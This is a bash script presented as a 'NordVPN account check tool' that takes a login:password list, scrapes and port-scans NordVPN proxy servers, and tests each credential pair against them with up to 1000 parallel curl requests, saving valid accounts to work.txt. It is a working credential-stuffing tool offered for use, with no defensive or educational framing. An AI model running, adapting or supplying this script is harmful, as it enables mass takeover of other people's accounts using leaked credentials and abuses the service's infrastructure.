#Nordvpn account check tool v1.5 Created by matrix
#
#Run like bash chk2_updated.sh filename.txt, filename.txt must be in login:password format 
#Working proxy accounts will be stored into work.txt Multithreaded tool. default 1000 threads, you can change inside.

if [[ $# -eq 0 ]] ; then
    echo 'Nordvpn check tool v1.5'
    echo 'Created by matrix'
    echo 'Run like bash chk2_updated.sh  filename.txt'
    echo 'filename.txt must be in login:password format'
    echo 'Working proxy accounts will be stored into work.txt'
    exit 0
fi

echo 'Nordvpn check tool v1.5'
echo 'Created by matrix'
echo 'Working proxy accounts will be stored into work.txt'
sleep 3

fn=$1
t=`wc -l $fn`
out=work.txt
threads=1000
tmo=30
slp=1
ct=0
cct=0

echo Getting proxy list
if [ "$(( $(date +"%s") - $(stat -c "%Y" /tmp/tm1) ))" -gt "3600" ]; then
   echo "/tmp/tm1 (proxy file of nordvpn) is older then 1 hour"
   curl -i -s https://nordvpn.com/ru/ovpn/ |grep '<span class="mr-2">'|cut -d\> -f2|cut -d\< -f1|shuf -n 150 >/tmp/tm0
   echo Check with nmap open ports
   nmap -Pn -n --open --min-rate 1000 -p1080 -iL /tmp/tm0|grep "report for"|awk '{print $5}'>/tmp/tm1;echo Proxy list is count `wc -l /tmp/tm1` of `wc -l /tmp/tm0`;cat /tmp/tm1
   echo _________________________________
   echo Starting total for checking $t
   echo _________________________________
   cat $fn|tr -d "\r" >$fn.tmp; mv $fn.tmp $fn
else
  echo "/tmp/tm1 (proxy file of nordvpn) is not older then 1 hour, skipping update"
  sleep 2
fi
pr=`shuf -n 1 /tmp/tm1`

while read p; do
  cct=$((cct+1))
  pr=`shuf -n 1 /tmp/tm1`
#  ct=`ps|grep curl|wc -l`
  ct=$((ct+1))
  if [ "$ct" -ge "$threads" ]; then 
  echo Working $cct / $t
  while [ true ]; do
    if [ `ps|grep curl|wc -l` -ge "$threads"  ]; then
      echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads
      echo Working $cct / $t
      sleep $slp
      ct=`ps|grep curl|wc -l`
    else
      ct=`ps|grep curl|wc -l`
      #echo We continue, current load  $ct of $threads
      break
    fi
  done
  fi
  set -- "$p" 
  IFS=":"; declare -a Array=($*)  
  
  (curl --retry 2 --retry-connrefused --retry-delay 1 --retry-max-time 10 --connect-timeout $tmo -m $tmo -sf -U ${Array[0]}:${Array[1]} --socks5 $pr:1080 2ip.ru >/dev/null && (echo +Valid:"${Array[0]}:${Array[1]}" && echo "${Array[0]}:${Array[1]}"  >>$out) )&
done < $fn


while [ true ]; do
  if [ `ps|grep curl|wc -l` -ge 1  ]
  then 
    echo We sleep $slp sec. Current proc running `ps|grep curl|wc -l` Limit : $threads && sleep $slp
  else
    echo We continue, Current proc running `ps|grep curl|wc -l`
    sleep $slp
    cp work.txt work_all.txt
    cat work_all.txt|sort|uniq >work.txt
    echo total work:`wc -l work_all.txt` clean:`wc -l work.txt`
    break
  fi
done
